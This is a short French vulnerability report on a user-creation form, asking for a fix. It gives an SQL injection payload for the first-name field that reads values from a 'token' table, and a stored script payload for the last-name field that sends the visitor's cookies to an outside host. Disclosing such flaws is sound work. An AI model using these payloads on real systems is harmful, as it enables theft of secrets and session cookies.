# SQL Injection

Dans le formulaire de création d'utilisateur, vous pouvez saisir :
* prenom : `',(select token_value from token)) # ` 


Autre injection possible : 
* Nom : `<script>document.location="http://www.google.fr?data="+document.cookie</script>`
* Prénom : `Attaquant`

Cela a pour conséquence de rendre accessible une valeur située dans une autre table `token`.

Pourriez-vous corriger ?
